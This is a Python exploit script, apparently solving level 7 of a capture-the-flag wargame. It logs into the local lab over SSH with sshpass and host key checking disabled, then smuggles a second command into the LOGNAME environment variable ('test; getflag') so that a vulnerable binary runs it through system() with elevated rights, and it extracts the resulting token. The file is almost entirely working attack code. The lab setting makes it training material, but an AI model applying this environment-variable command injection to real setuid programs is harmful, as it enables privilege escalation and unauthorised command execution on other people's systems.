"""
Level07 - LOGNAME Environment Variable Command Injection

Objective:
    Exploit unsanitized LOGNAME environment variable to execute code as flag07.

Vulnerability:
    Binary passes environment variable directly to system() without validation.

Usage:
    python3 exploit.py
"""

import subprocess
import sys
import re


# ============================================================================
# Helper Functions
# ============================================================================

def ssh_cmd(host, port, user, pwd, cmd):
    """Execute SSH command."""
    try:
        result = subprocess.run(
            [
                "sshpass",
                "-p",
                pwd,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-p",
                str(port),
                f"{user}@{host}",
                cmd,
            ],
            capture_output=True,
            text=True,
            timeout=10,
        )
        return result.returncode, result.stdout, result.stderr
    except:
        return -1, "", ""


# ============================================================================
# Exploitation
# ============================================================================

def exploit(host, port, ssh_port, pwd):
    """Execute LOGNAME environment variable injection."""
    print(f"[*] Connecting to level07@{host}:{ssh_port}")
    code, out, err = ssh_cmd(host, ssh_port, "level07", pwd, "id")
    if code != 0:
        print("[!] SSH connection failed")
        return False, ""
    print(f"[+] SSH OK: {out.strip()}\n")

    print("[*] Exploiting LOGNAME environment variable injection...")
    cmd = "LOGNAME='test; getflag' ./level07"
    code, out, err = ssh_cmd(host, ssh_port, "level07", pwd, cmd)

    full_output = out + err
    if "token" in full_output.lower():
        print(f"[+] Exploit executed!")
        match = re.search(r"token\s*:\s*([a-zA-Z0-9_-]+)", full_output)
        if match:
            token = match.group(1)
            print(f"[+] Token found: {token}")
            return True, token
        return True, full_output.strip()

    print(f"[!] Failed. Code: {code}")
    return False, ""


# ============================================================================
# Main
# ============================================================================

def main():
    print("Level07 LOGNAME Command Injection Exploit\n")

    try:
        with open("level06/flag", "r") as f:
            pwd = f.read().strip()
        print(f"[+] Level06 token: {pwd}\n")
    except:
        print("[!] Could not read level06 token")
        sys.exit(1)

    success, token = exploit("localhost", 4747, 4242, pwd)

    if success:
        print("\n[SUMMARY]")
        print(f"  Vulnerability: Environment variable command injection")
        print(f"  Attack: Unsanitized LOGNAME passed to shell via system()")
        print(f"  Result: Arbitrary command execution as flag07\n")
        print(f"[ANSWER]")
        print(f"  Level07 Token: {token}")
    else:
        print("[!] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
